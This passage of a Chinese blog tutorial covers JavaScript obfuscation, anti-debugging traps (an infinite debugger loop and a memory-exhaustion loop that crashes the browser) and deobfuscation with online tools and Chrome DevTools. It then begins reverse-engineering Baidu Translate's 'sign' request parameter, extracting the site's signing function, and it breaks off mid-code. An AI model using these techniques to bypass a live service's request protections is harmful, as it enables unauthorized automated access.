class="line">    c = a + b;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(c);</span><br></pre></td></tr></table></figure></li><li><p>死代码插入，即在源码插入一些不会被执行的代码。</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">let a = 1;</span></span><br><span class="line"><span class="comment">let b = 2;</span></span><br><span class="line"><span class="comment">let c = a + b;</span></span><br><span class="line"><span class="comment">console.log(c);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">let</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> b = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(a - b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> c = a + b;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(c);</span><br></pre></td></tr></table></figure></li><li><p>代码转换，将代码转换为等价的，但更难理解的形式。</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">let a = 1;</span></span><br><span class="line"><span class="comment">let b = 2;</span></span><br><span class="line"><span class="comment">let c = a + b;</span></span><br><span class="line"><span class="comment">console.log(c);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">let</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> b = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">let</span> c = a - (-b);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(c);</span><br></pre></td></tr></table></figure></li></ul><h3 id="常见反调试手段"><a href="#常见反调试手段" class="headerlink" title="常见反调试手段"></a>常见反调试手段</h3><p>实现防止他人调试、动态分析自己的代码，我们可以预先在代码中做处理，防止用户调试代码。</p><ul><li><p>无限 debugger。比如写个定时器死循环禁止调试。</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> c = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">c.<span class="property">toString</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;检测到调试&quot;</span>)</span><br><span class="line">    <span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">debugger</span></span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(c);</span><br></pre></td></tr></table></figure></li><li><p>内存耗尽。更隐蔽的反调试手段，代码运行造成的内存占用会越来越大，很快会使浏览器崩溃。</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> startTime = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="keyword">debugger</span>;</span><br><span class="line"><span class="keyword">var</span> endTime = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="keyword">var</span> isDev = endTime - startTime &gt; <span class="number">100</span>;</span><br><span class="line"><span class="keyword">var</span> stack = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isDev) &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        stack.<span class="title function_">push</span>(<span class="variable language_">this</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(stack.<span class="property">length</span>, <span class="variable language_">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>检测函数、对象属性修改。攻击者在调试的时，经常会把防护的函数删除，或者把检测数据对象进行篡改。可以检测函数内容，在原型上设置禁止修改。</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">eval</span>(<span class="params"></span>) &#123;</span><br><span class="line">    [native code]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">eval</span> = <span class="keyword">function</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[native code]&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">eval</span> = <span class="keyword">function</span>(<span class="params">str</span>) &#123;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">eval</span>.<span class="property">toString</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`function eval() &#123;[native code]&#125;`</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hijacked</span>(<span class="params">fun</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;prototype&quot;</span> <span class="keyword">in</span> fun || fun.<span class="title function_">toString</span>().<span class="title function_">replace</span>(<span class="regexp">/\n|\s/g</span>, <span class="string">&quot;&quot;</span>) != <span class="string">&quot;function&quot;</span> + fun.<span class="property">name</span> + <span class="string">&quot;() &#123;[nativecode]&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="前端开发中的混淆"><a href="#前端开发中的混淆" class="headerlink" title="前端开发中的混淆"></a>前端开发中的混淆</h3><p>在 Web 前端开发中，开发者会对代码进行压缩和混淆，对代码进行优化，并提高安全性。已经有很多成熟的工具可以使用，比如 <a href="https://github.com/mishoo/UglifyJS">UglifyJS</a> 和 <a href="https://github.com/javascript-obfuscator/javascript-obfuscator">JavaScript Obfuscator</a>。</p><p>混淆通常在项目的构建过程中进行。例如，我们使用 Vite 作为模块打包工具，就可以在 vite 的配置文件中添加UglifyJS 插件。这样，在每次构建项目时，UglifyJS就会自动对你的代码进行混淆。</p><p>先安装插件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install vite-plugin-uglify --save-dev</span><br></pre></td></tr></table></figure><p>然后在配置文件中添加该插件。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; defineConfig &#125; <span class="keyword">from</span> <span class="string">&#x27;vite&#x27;</span></span><br><span class="line"><span class="keyword">import</span> vue <span class="keyword">from</span> <span class="string">&#x27;@vitejs/plugin-vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">VitePluginUglify</span> <span class="keyword">from</span> <span class="string">&#x27;vite-plugin-uglify&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="title function_">vue</span>(),</span><br><span class="line">    <span class="title class_">VitePluginUglify</span>()</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>在这个配置文件中，<code>VitePluginUglify</code>被添加到了<code>plugins</code>数组中，所以在构建过程中，Vite 会自动使用<code>vite-plugin-uglify</code>对代码进行混淆。</p><h3 id="在线混淆工具"><a href="#在线混淆工具" class="headerlink" title="在线混淆工具"></a>在线混淆工具</h3><p>有些站点提供了在线混淆的功能，比如 <a href="https://javascriptobfuscator.dev/">Free JavaScript Obfuscator</a>，提供 JS 代码即可得到混淆后的结果。这个站点的混淆基于上面提到的 <a href="https://github.com/javascript-obfuscator/javascript-obfuscator">JavaScript Obfuscator</a> 实现。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fibonacci</span>(<span class="params">n</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> fib = [<span class="number">0</span>, <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    fib[i] = fib[i - <span class="number">1</span>] + fib[i - <span class="number">2</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> fib;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// the first 10 numbers in the Fibonacci sequence</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">fibonacci</span>(<span class="number">10</span>));</span><br></pre></td></tr></table></figure><p>以上代码的作用是计算斐波那契数列的前 10 个值并打印出来，经过混淆可得以下内容，可读性肉眼可见的降低：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> _0x323128=_0x5512;(<span class="keyword">function</span>(<span class="params">_0x589643,_0x5459af</span>)&#123;<span class="keyword">const</span> _0x1b79b8=_0x5512,_0x3e96ed=<span class="title function_">_0x589643</span>();<span class="keyword">while</span>(!![])&#123;<span class="keyword">try</span>&#123;<span class="keyword">const</span> _0x1fb1b3=-<span class="built_in">parseInt</span>(<span class="title function_">_0x1b79b8</span>(<span class="number">0x1f1</span>))/<span class="number">0x1</span>*(-<span class="built_in">parseInt</span>(<span class="title function_">_0x1b79b8</span>(<span class="number">0x1ea</span>))/<span class="number">0x2</span>)+-<span class="built_in">parseInt</span>(<span class="title function_">_0x1b79b8</span>(<span class="number">0x1ec</span>))/<span class="number">0x3</span>*(<span class="built_in">parseInt</span>(<span class="title function_">_0x1b79b8</span>(<span class="number">0x1f3</span>))/<span class="number">0x4</span>)+-<span class="built_in">parseInt</span>(<span class="title function_">_0x1b79b8</span>(<span class="number">0x1ed</span>))/<span class="number">0x5</span>*(<span class="built_in">parseInt</span>(<span class="title function_">_0x1b79b8</span>(<span class="number">0x1f2</span>))/<span class="number">0x6</span>)+-<span class="built_in">parseInt</span>(<span class="title function_">_0x1b79b8</span>(<span class="number">0x1e8</span>))/<span class="number">0x7</span>+<span class="built_in">parseInt</span>(<span class="title function_">_0x1b79b8</span>(<span class="number">0x1e9</span>))/<span class="number">0x8</span>*(-<span class="built_in">parseInt</span>(<span class="title function_">_0x1b79b8</span>(<span class="number">0x1f4</span>))/<span class="number">0x9</span>)+<span class="built_in">parseInt</span>(<span class="title function_">_0x1b79b8</span>(<span class="number">0x1f0</span>))/<span class="number">0xa</span>+-<span class="built_in">parseInt</span>(<span class="title function_">_0x1b79b8</span>(<span class="number">0x1ef</span>))/<span class="number">0xb</span>*(-<span class="built_in">parseInt</span>(<span class="title function_">_0x1b79b8</span>(<span class="number">0x1ee</span>))/<span class="number">0xc</span>);<span class="keyword">if</span>(_0x1fb1b3===_0x5459af)<span class="keyword">break</span>;<span class="keyword">else</span> _0x3e96ed[<span class="string">&#x27;push&#x27;</span>](_0x3e96ed[<span class="string">&#x27;shift&#x27;</span>]());&#125;<span class="keyword">catch</span>(_0x56184c)&#123;_0x3e96ed[<span class="string">&#x27;push&#x27;</span>](_0x3e96ed[<span class="string">&#x27;shift&#x27;</span>]());&#125;&#125;&#125;(_0x138e,<span class="number">0xdf35a</span>));<span class="keyword">function</span> <span class="title function_">_0x138e</span>(<span class="params"></span>)&#123;<span class="keyword">const</span> _0x3a0863=[<span class="string">&#x27;354072hRaVAZ&#x27;</span>,<span class="string">&#x27;9mNckCh&#x27;</span>,<span class="string">&#x27;1622341lDdscp&#x27;</span>,<span class="string">&#x27;2787864kenYBK&#x27;</span>,<span class="string">&#x27;546362IExhCV&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;3fofuVm&#x27;</span>,<span class="string">&#x27;1946005vlrFyq&#x27;</span>,<span class="string">&#x27;516IsqKpc&#x27;</span>,<span class="string">&#x27;725241tPbpzZ&#x27;</span>,<span class="string">&#x27;316200mzqtLe&#x27;</span>,<span class="string">&#x27;1mgkmrs&#x27;</span>,<span class="string">&#x27;24Zwposp&#x27;</span>];_0x138e=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">return</span> _0x3a0863;&#125;;<span class="keyword">return</span> <span class="title function_">_0x138e</span>();&#125;<span class="keyword">function</span> <span class="title function_">fibonacci</span>(<span class="params">_0x1b3125</span>)&#123;<span class="keyword">let</span> _0x9e88df=[<span class="number">0x0</span>,<span class="number">0x1</span>];<span class="keyword">for</span>(<span class="keyword">let</span> _0x406b50=<span class="number">0x2</span>;_0x406b50&lt;=_0x1b3125;_0x406b50++)&#123;_0x9e88df[_0x406b50]=_0x9e88df[_0x406b50-<span class="number">0x1</span>]+_0x9e88df[_0x406b50-<span class="number">0x2</span>];&#125;<span class="keyword">return</span> _0x9e88df;&#125;<span class="keyword">function</span> <span class="title function_">_0x5512</span>(<span class="params">_0x2d5465,_0x1d0a2f</span>)&#123;<span class="keyword">const</span> _0x138ec4=<span class="title function_">_0x138e</span>();<span class="keyword">return</span> _0x5512=<span class="keyword">function</span>(<span class="params">_0x5512ef,_0x5e1f2e</span>)&#123;_0x5512ef=_0x5512ef-<span class="number">0x1e8</span>;<span class="keyword">let</span> _0x4be64a=_0x138ec4[_0x5512ef];<span class="keyword">return</span> _0x4be64a;&#125;,<span class="title function_">_0x5512</span>(_0x2d5465,_0x1d0a2f);&#125;<span class="variable language_">console</span>[<span class="title function_">_0x323128</span>(<span class="number">0x1eb</span>)](<span class="title function_">fibonacci</span>(<span class="number">0xa</span>));</span><br></pre></td></tr></table></figure><h2 id="Deobfuscator-反混淆"><a href="#Deobfuscator-反混淆" class="headerlink" title="Deobfuscator 反混淆"></a>Deobfuscator 反混淆</h2><p>JS 反混淆（Deobfuscator ）是指对经过混淆处理的代码进行还原和解析，以恢复其可读性。Deobfuscator 可以通过对代码进行静态分析和动态分析等方式来实现。需要注意的是，Obfuscation 只能降低可读性，不能完全避免逆向攻击，而 Deobfuscator 也并不能完全还原混淆过的代码。</p><p>只要耐心分析，多数混淆过的 JS 已然能还原出来。</p><h3 id="在线反混淆工具"><a href="#在线反混淆工具" class="headerlink" title="在线反混淆工具"></a>在线反混淆工具</h3><p>反混淆要有些趁手的工具。最常用的是浏览器自带的开发者工具，其次是一些转换混淆过的代码的工具。以下网站提供在线反混淆 JS 代码的功能：</p><ul><li><a href="https://seosniffer.com/javascript-deobfuscator">javascript-deobfuscator</a></li><li><a href="https://dev-coco.github.io/Online-Tools/JavaScript-Deobfuscator.html">Raz1ner JavaScript Deobfuscator</a></li><li><a href="https://deobfuscate.relative.im/">synchrony deobuscator</a></li><li><a href="https://beautifier.io/">js-beauty</a></li></ul><p>以我们经过混淆的代码为例，丢进上述第一个网站，可以得到以下反混淆过的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fibonacci</span>(<span class="params">jayandre</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> ramonita = [<span class="number">0</span>, <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> ancel = <span class="number">2</span>; ancel &lt;= jayandre; ancel++) &#123;</span><br><span class="line">    ramonita[ancel] = ramonita[ancel - <span class="number">1</span>] + ramonita[ancel - <span class="number">2</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ramonita;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">fibonacci</span>(<span class="number">10</span>));</span><br></pre></td></tr></table></figure><p>原本的逻辑已经较为清晰的展现了。当然也有一些库能用来反混淆本地 JS 文件，这里不多做介绍，感觉在线工具就够用了。</p><h3 id="开发者工具"><a href="#开发者工具" class="headerlink" title="开发者工具"></a>开发者工具</h3><p>上面的反混淆站点只是辅助，真反混淆还得靠浏览器自带的开发者工具。接下来以chrome浏览器为例讲讲怎么用。</p><p>在反混淆过程中，我们主要使用源代码（Source）和网络（Network）这两个模块。Network 用于查找我们进行用户操作时调用了哪些 API，在调用 API 前后运行了哪些 JS 文件；Source 提供了网站整体的 JS 代码及静态资源，我们的反混淆分析工作主要就在这里进行。</p><p>在 Source 模块中，默认<code>ctrl+shift+p</code>可以开启开发者工具的命令行，我们可以找到两个“搜索”工具，分别对应“全局搜索”和“在当前文件中搜索”，很适合查找指定字段。</p><p><img src="https://img.ma5hr00m.top/blog/20240222095405.png" alt="20240222095405"></p><p>开发者工具提供了替换（Override）功能，开启本地替换选项，上传自己的目录，然后选中浏览器中指定 JS 文件，做出修改后<code>ctrl+s</code>保存，即可将源文件保存到我们自己的目录中，之后对文件做出的修改可以直接替换对应的原文件，这样就能方便的修改浏览器端 JS 文件。</p><p><img src="https://img.ma5hr00m.top/blog/20240222095414.png" alt="20240222095414"></p><p>剩下的就是动调了，后面会举例子解释。</p><h3 id="静-动态调试"><a href="#静-动态调试" class="headerlink" title="静&#x2F;动态调试"></a>静&#x2F;动态调试</h3><p>先做个区分，逆网页的 JS 代码更多得是在开发者工具中做动调的。</p><ul><li>静态调试：静态调试是通过分析代码的结构和逻辑来理解其功能。这种方法不需要运行代码，只需要对代码进行分析和理解。例如，可以通过反汇编工具将二进制的可执行文件翻译成汇编代码，通过对代码的分析来破解软件。</li><li>动态调试：动态调试则是在代码运行时进行的。通过设置断点，单步执行，观察变量的值变化等方式，来理解代码的运行过程和逻辑。动态调试可以有效应对多数混淆措施，从中还原出运行逻辑，是逆向分析的关键手段。前面说的反调试便是阻拦动态调试。</li></ul><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="百度翻译接口"><a href="#百度翻译接口" class="headerlink" title="百度翻译接口"></a>百度翻译接口</h3><p>未登录状态下翻译字符串，观察 Network 可以找到<code>/v2transapi</code> POST 请求报文，其 payload 中表单的 <code>query</code>字段即为我们输入待翻译的字符串。</p><p><img src="https://img.ma5hr00m.top/blog/20240222095423.png" alt="20240222095423"></p><p>刷新页面多次翻译，发现只有<code>sign</code>字段的值在随<code>query</code>一直变化，<code>transtype</code>的值会根据触发翻译的方式在<code>realtime</code>和<code>enter</code>之间切换，其它字段值保持不变。我们接下来的任务就是分析<code>sign</code>字段的值是怎么来的。</p><p>为了搞清楚<code>sign</code>是如何生成的，我们需要在 Sources 模块中全局搜索<code>sign</code>字段。但因为<code>sign</code>本身是一个常见的字段，我们很容易定位到其他与表单无关的地方。这里有一个小技巧，为了获得参数相关代码，我们可以搜索<code>sign:</code>或者<code>sign=</code>，以尽量避免定位到无关代码。</p><p>在 Sources 模块中全局搜索<code>sign:</code>，定位到很多文件，根据文件名和文件内容，可以判断最有可能在 index.36217dc5.js 文件中，而该文件中出现了 6 处<code>sign:</code>相关代码，依次打断点并执行翻译操作，发现只会在 25800 行处的<code>sign: b(e);</code>处停下：</p><p><img src="https://img.ma5hr00m.top/blog/20240222095432.png" alt="20240222095432"></p><p>单步步进，可以发现参数 t 值即为传入的字符串：</p><p><img src="https://img.ma5hr00m.top/blog/20240222095443.png" alt="20240222095443"></p><p>把这段函数抽离出来，写到一个 main.js 文件中，调用该函数并运行：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> o, i = t.<span class="title function_">match</span>(<span class="regexp">/[\uD800-\uDBFF][\uDC00-\uDFFF]/g</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">null</span> === i) &#123;</span><br><span class="line">    <span class="keyword">var</span> a = t.<span class="property">length</span>;</span><br><span class="line">    a &gt; <span class="number">30</span> &amp;&amp; (t = <span class="string">&quot;&quot;</span>.<span class="title function_">concat</span>(t.<span class="title function_">substr</span>(<span class="number">0</span>, <span class="number">10</span>)).<span class="title function_">concat</span>(t.<span class="title function_">substr</span>(<span class="title class_">Math</span>.<span class="title function_">floor</span>(a / <span class="number">2</span>) - <span class="number">5</span>, <span class="number">10</span>)).<span class="title function_">concat</span>(t.<span class="title function_">substr</span>(-<span class="number">10</span>, <span class="number">10</span>)))</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> s = t.<span class="title function_">split</span>(<span class="regexp">/[\uD800-\uDBFF][\uDC00-\uDFFF]/</span>), c = <span class="number">0</span>, u = s.<span class="property">length</span>, l = []; c &lt; u; c++)</span><br><span class="line">      <span class="string">&quot;&quot;</span> !== s[c] &amp;&amp; l.<span class="property">push</span>.<span class="title function_">apply</span>(l, <span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(t))</span><br><span class="line">          <span class="keyword">return</span> <span class="title function_">e</span>(t)</span><br><span class="line">      &#125;(o = s[c].<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>)) || <span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;undefined&quot;</span> != <span class="keyword">typeof</span> <span class="title class_">Symbol</span> &amp;&amp; <span class="literal">null</span> != t[<span class="title class_">Symbol</span>.<span class="property">iterator</span>] || <span class="literal">null</span> != t[<span class="string">&quot;@@iterator&quot;</span>])</span><br><span class="line">          <span class="keyword">return</span> <span class="title class_">Array</span>.<span class="title function_">from</span>(t)</span><br><span class="line">      &#125;(o) || <span class="keyword">function</span>(<span class="params">t, n</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (t) &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> t)</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">e</span>(t, n);</span><br><span class="line">          <span class="keyword">var</span> r = <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(t).<span class="title function_">slice</span>(<span class="number">8</span>, -<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="string">&quot;Object&quot;</span> === r &amp;&amp; t.<span class="property">constructor</span> &amp;&amp; (r = t.<span class="property">constructor</span>.<span class="property">name</span>),</span><br><span class="line">          <span class="string">&quot;Map&quot;</span> === r || <span class="string">&quot;Set&quot;</span> === r ? <span class="title class_">Array</span>.<span class="title function_">from</span>(t) : <span class="string">&quot;Arguments&quot;</span> === r || <span class="regexp">/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/</span>.<span class="title function_">test</span>(r) ? <span class="title function_">e</span>(t, n) : <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;(o) || <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TypeError</span>(<span class="string">&quot;Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.&quot;</span>)</span><br><span class="line">      &#125;()),</span><br><span class="line">      c !== u - <span class="number">1</span> &amp;&amp; l.<span class="title function_">push</span>(i[c]);</span><br><span class="line">    <span class="keyword">var</span> p = l.<span class="property">length</span>;</span><br><span class="line">    p &gt; <span class="number">30</span> &amp;&amp; (t = l.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">10</span>).<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>) + l.<span class="title function_">slice</span>(<span class="title class_">Math</span>.<span class="title function_">floor</span>(p / <span class="number">2</span>) - <span class="number">5</span>, <span class="title class_">Math</span>.<span class="title function_">floor</span>(p / <span class="number">2</span>) + <span class="number">5</span>).<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>) + l.<span class="title function_">slice</span>(-<span class="number">10</span>).<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>))</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> d = <span class="string">&quot;&quot;</span>.<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">103</span>)).<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">116</span>)).<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">107</span>)), h = (<span class="literal">null</span> !== r ? r : (r = <span class="variable language_">window</span>[d] || <span class="string">&quot;&quot;</span>) || <span class="string">&quot;&quot;</span>).<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>), f = <span class="title class_">Number</span>(h[<span class="number">0</span>]) || <span class="number">0</span>, m = <span class="title class_">Number</span>(h[<span class="number">1</span>]) || <span class="number">0</span>, g = [], y = <span class="number">0</span>, v = <span class="number">0</span>; v &lt; t.<span class="property">length</span>; v++) &#123;</span><br><span class="line">    <span class="keyword">var</span> _ = t.<span class="title function_">charCodeAt</span>(v);</span><br><span class="line">    _ &lt; <span class="number">128</span> ? g[y++] = _ : (_ &lt; <span class="number">2048</span> ? g[y++] = _ &gt;&gt; <span class="number">6</span> | <span class="number">192</span> : (<span class="number">55296</span> == (<span class="number">64512</span> &amp; _) &amp;&amp; v + <span class="number">1</span> &lt; t.<span class="property">length</span> &amp;&amp; <span class="number">56320</span> == (<span class="number">64512</span> &amp; t.<span class="title function_">charCodeAt</span>(v + <span class="number">1</span>)) ? (_ = <span class="number">65536</span> + ((<span class="number">1023</span> &amp; _) &lt;&lt; <span class="number">10</span>) + (<span class="number">1023</span> &amp; t.<span class="title function_">charCodeAt</span>(++v)),</span><br><span class="line">    g[y++] = _ &gt;&gt; <span class="number">18</span> | <span class="number">240</span>,</span><br><span class="line">    g[y++] = _ &gt;&gt; <span class="number">12</span> &amp; <span class="number">63</span> | <span class="number">128</span>) : g[y++] = _ &gt;&gt; <span class="number">12</span> | <span class="number">224</span>,</span><br><span class="line">    g[y++] = _ &gt;&gt; <span class="number">6</span> &amp; <span class="number">63</span> | <span class="number">128</span>),</span><br><span class="line">    g[y++] = <span class="number">63</span> &amp; _ | <span class="number">128</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> b = f, w = <span class="string">&quot;&quot;</span>.<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">43</span>)).<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">45</span>)).<span class="title 